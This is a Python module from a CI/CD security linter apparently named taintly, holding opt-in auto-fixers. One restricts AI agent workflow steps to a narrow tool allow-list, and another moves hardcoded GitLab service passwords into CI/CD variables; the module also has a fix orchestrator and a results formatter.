# =============================================================================
# Opt-in fix: scaffold ``allowed_tools`` for AI agent actions (AI-GH-020)
# =============================================================================
#
# When a step uses ``anthropics/claude-code-action`` / similar agent
# action without an ``allowed_tools`` (or ``claude_args: --allowed-
# tools=...``) input, inject a minimal allow-list scaffold so the
# agent's tool surface is narrow by default.  The scaffold is
# intentionally restrictive — a single named inline-comment tool —
# because the correct allow-list is workflow-specific and a
# too-permissive default would defeat the point.  The user is
# expected to widen the list after reviewing the PR.
_GH_AGENT_ACTION = re.compile(
    r"(?P<indent>\s*)(?:-\s*)?uses:\s+"
    r"(?:"
    r"anthropics/claude-code-action"
    r"|google-github-actions/run-gemini-cli"
    r"|github/copilot-[a-zA-Z0-9-]+-action"
    r"|paul-gauthier/aider-action"
    r"|openhands/[a-zA-Z0-9-]*action"
    r"|coderabbit(?:ai)?/[a-zA-Z0-9-]*action"
    r")"
    r"[^@\s]*@[^\s]+"
)

_GH_ALLOWED_TOOLS_PRESENT = re.compile(
    r"(?:"
    r"\ballowed[_-]tools\s*:"
    r"|\ballowedTools\s*:"
    r"|--allowed-tools\b"
    r"|--allowedTools\b"
    r"|--disallowed-tools\b"
    r"|\bdisallowed_tools\s*:"
    r")"
)

_GH_AGENT_ALLOWED_TOOLS_SCAFFOLD = (
    'allowed_tools: "mcp__github_inline_comment__create_inline_comment"  '
    "# taintly scaffold (AI-GH-020): narrow list; widen to the "
    "tools your workflow actually needs."
)


def fix_github_ai_allowed_tools_scaffold(filepath: str, dry_run: bool = False) -> list[FixResult]:
    """Inject an ``allowed_tools:`` scaffold under any agent action
    step that doesn't already declare a tool allowlist.  OPT-IN
    because it restricts the agent's tool surface to a single narrow
    tool — which WILL break workflows that relied on wildcard access;
    the user is expected to widen the list after review."""
    results: list[FixResult] = []
    with open(filepath, encoding="utf-8") as f:
        content = f.read()

    # File-level check: if the workflow already constrains tools
    # anywhere, treat the file as already-mitigated to avoid layering
    # conflicting scaffolds into a single workflow.
    if _GH_ALLOWED_TOOLS_PRESENT.search(content):
        return results

    lines = content.splitlines(keepends=True)
    new_lines: list[str] = []
    modified = False
    i = 0
    while i < len(lines):
        line = lines[i]
        m = _GH_AGENT_ACTION.search(line)
        if not m:
            new_lines.append(line)
            i += 1
            continue

        new_lines.append(line)
        # Look for a ``with:`` sibling in the next few lines; if found,
        # inject the scaffold as the first key under it.  If not, emit
        # a fresh ``with:`` block right after the ``uses:`` line.
        step_indent = len(m.group("indent"))
        child_indent = " " * (step_indent + 2)
        grandchild_indent = " " * (step_indent + 4)

        # Peek ahead to find `with:` at step_indent + 2 within ~8 lines.
        peek = i + 1
        found_with_at: int | None = None
        while peek < min(i + 9, len(lines)):
            nxt = lines[peek]
            stripped = nxt.strip()
            if not stripped:
                peek += 1
                continue
            nxt_indent = len(nxt) - len(nxt.lstrip())
            if nxt_indent <= step_indent:
                # Exited this step's block.
                break
            if nxt_indent == step_indent + 2 and stripped.startswith("with:"):
                found_with_at = peek
                break
            peek += 1

        scaffold_line = f"{grandchild_indent}{_GH_AGENT_ALLOWED_TOOLS_SCAFFOLD}\n"
        if found_with_at is not None:
            # Copy lines up to and including the `with:` line.
            for j in range(i + 1, found_with_at + 1):
                new_lines.append(lines[j])
            new_lines.append(scaffold_line)
            i = found_with_at + 1
        else:
            # No `with:` — create one right after `uses:`.
            new_lines.append(f"{child_indent}with:\n")
            new_lines.append(scaffold_line)
            i += 1

        results.append(
            FixResult(
                file=filepath,
                line=i,
                original=line.rstrip(),
                fixed=(
                    line.rstrip()
                    + "\n"
                    + (f"{child_indent}with:\n" if found_with_at is None else "")
                    + scaffold_line.rstrip()
                ),
                fix_type="github_ai_allowed_tools_scaffold",
                applied=not dry_run,
            )
        )
        modified = True

    if modified and not dry_run:
        with open(filepath, "w", encoding="utf-8") as f:
            f.writelines(new_lines)
    return results


# =============================================================================
# Opt-in fix: hoist hardcoded service credentials into $VAR references
# (SEC2-GL-003)
# =============================================================================
#
# Replace ``POSTGRES_PASSWORD: <literal>`` with ``POSTGRES_PASSWORD:
# $POSTGRES_PASSWORD`` in a GitLab pipeline's ``variables:`` block.
# Leaves a comment pointing at Settings > CI/CD > Variables as the
# place to configure the Masked + Protected value.  OPT-IN because
# the build will fail on the next run if the variable isn't
# configured — failing fast is the whole point, but users need a
# heads-up.
_GL_SERVICE_PASSWORD_LITERAL = re.compile(
    r"^(?P<indent>\s*)(?P<key>"
    r"POSTGRES|MYSQL|MARIADB|MONGO|MONGODB|REDIS|"
    r"RABBITMQ(?:_DEFAULT)?|MINIO(?:_ROOT)?|ELASTIC|"
    r"NEO4J|COUCHDB|KEYCLOAK|GRAFANA|PGADMIN|ADMIN|ROOT|"
    r"DB|DATABASE|SQL|MQTT|SMTP|LDAP|API)_(?P<suffix>PASSWORD|PASS)"
    r"\s*:\s*['\"]?(?![\$#{])[^\s'\"#]{4,}['\"]?\s*(?:#[^\n]*)?\s*$"
)


def fix_hoist_service_credentials(filepath: str, dry_run: bool = False) -> list[FixResult]:
    """Rewrite ``POSTGRES_PASSWORD: <literal>`` → ``POSTGRES_PASSWORD:
    $POSTGRES_PASSWORD`` in a GitLab pipeline.  OPT-IN because the
    next pipeline run will fail if the CI/CD variable isn't configured
    in GitLab settings; the failure is correct but users should know
    to expect it."""
    results: list[FixResult] = []
    # Only act on .gitlab-ci.yml-shaped files (including includes).
    from os.path import basename

    name = basename(filepath)
    # Normalise filepath separators before the substring check so a
    # ``\ci\`` segment on Windows matches the ``/ci/`` literal — same
    # fix family as the XF-GH-003 / XF-GH-004 endswith bugs.
    filepath_fwd = filepath.replace("\\", "/")
    if not (name == ".gitlab-ci.yml" or name.endswith(".gitlab-ci.yml") or "/ci/" in filepath_fwd):
        return results

    with open(filepath, encoding="utf-8") as f:
        lines = f.readlines()

    new_lines: list[str] = []
    modified = False
    for i, line in enumerate(lines):
        m = _GL_SERVICE_PASSWORD_LITERAL.match(line)
        if m is None:
            new_lines.append(line)
            continue

        indent = m.group("indent")
        key = m.group("key")
        suffix = m.group("suffix")
        var_name = f"{key}_{suffix}"
        new_line = (
            f"{indent}{var_name}: ${var_name}  "
            f"# taintly hoist (SEC2-GL-003): set a Masked + Protected "
            f"CI/CD variable named ${var_name} in Settings > CI/CD > Variables.\n"
        )
        new_lines.append(new_line)
        results.append(
            FixResult(
                file=filepath,
                line=i + 1,
                original=line.rstrip(),
                fixed=new_line.rstrip(),
                fix_type="hoist_service_credentials",
                applied=not dry_run,
            )
        )
        modified = True

    if modified and not dry_run:
        with open(filepath, "w", encoding="utf-8") as f:
            f.writelines(new_lines)
    return results


# =============================================================================
# Main fix orchestrator
# =============================================================================

# Safe, semantics-preserving fixes — run by default on ``--fix``.
ALL_FIXERS = {
    "pin_sha": fix_pin_actions,
    "persist_credentials": fix_persist_credentials,
    "add_permissions": fix_add_permissions,
    "remove_insecure_commands": fix_remove_insecure_commands,
    "remove_debug_logging": fix_remove_debug_logging,
    "disable_setup_cache_in_release": fix_disable_setup_cache_in_release,
    "quote_github_refs": fix_quote_github_refs,
    "quote_gitlab_refs": fix_quote_gitlab_refs,
    "quote_gitlab_ci_vars": fix_quote_gitlab_ci_vars,
    "unquote_groovy_gstring_with_params": fix_unquote_groovy_gstring_with_params,
}

# Opt-in fixes that change build semantics — run only when the user
# explicitly requests them via a dedicated CLI flag.
OPT_IN_FIXERS = {
    "npm_ignore_scripts": fix_npm_ignore_scripts,
    "jenkins_cap_add_hint": fix_jenkins_cap_add_hint,
    "github_ai_allowed_tools_scaffold": fix_github_ai_allowed_tools_scaffold,
    "hoist_service_credentials": fix_hoist_service_credentials,
}


def apply_fixes(
    filepath: str,
    dry_run: bool = False,
    fix_types: list[str] | None = None,
    extra_fix_types: list[str] | None = None,
) -> list[FixResult]:
    """Apply safe fixes plus any explicitly-requested opt-in fixes.

    ``fix_types`` selects from :data:`ALL_FIXERS` (default: all).
    ``extra_fix_types`` adds opt-in fixes from :data:`OPT_IN_FIXERS` —
    these never run unless the caller requests them by name.
    """
    results: list[FixResult] = []
    fixers = fix_types or list(ALL_FIXERS.keys())

    for fix_name in fixers:
        if fix_name in ALL_FIXERS:
            results.extend(ALL_FIXERS[fix_name](filepath, dry_run=dry_run))

    for fix_name in extra_fix_types or []:
        if fix_name in OPT_IN_FIXERS:
            results.extend(OPT_IN_FIXERS[fix_name](filepath, dry_run=dry_run))

    return results


def format_fix_results(results: list[FixResult], dry_run: bool = False) -> str:
    """Format fix results as human-readable text."""
    out = []
    mode = "DRY RUN" if dry_run else "APPLIED"
    sep = sep_char() * 3
    out.append(f"\n\033[1m{sep} TAINTLY FIX ({mode}) {sep}\033[0m\n")

    if not results:
        out.append("  No fixable issues found.")
        return "\n".join(out)

    applied = [r for r in results if r.applied]
    failed = [r for r in results if not r.applied and r.error]
    # skipped = [r for r in results if not r.applied and not r.error]  # reserved

    if applied or dry_run:
        fixes = applied if not dry_run else [r for r in results if not r.error]
        out.append(f"  {'Would fix' if dry_run else 'Fixed'}: {len(fixes)}")
        for r in fixes:
            out.append(f"\n  \033[32m[{r.fix_type}]\033[0m {r.file}:{r.line}")
            out.append(f"    - {r.original}")
            out.append(f"    + {r.fixed}")

    if failed:
        out.append(f"\n  Failed: {len(failed)}")
        for r in failed:
            out.append(
                f"  \033[91m[{r.fix_type}]\033[0m {r.file}:{r.line} {em_dash_char()} {r.error}"
            )

    return "\n".join(out)
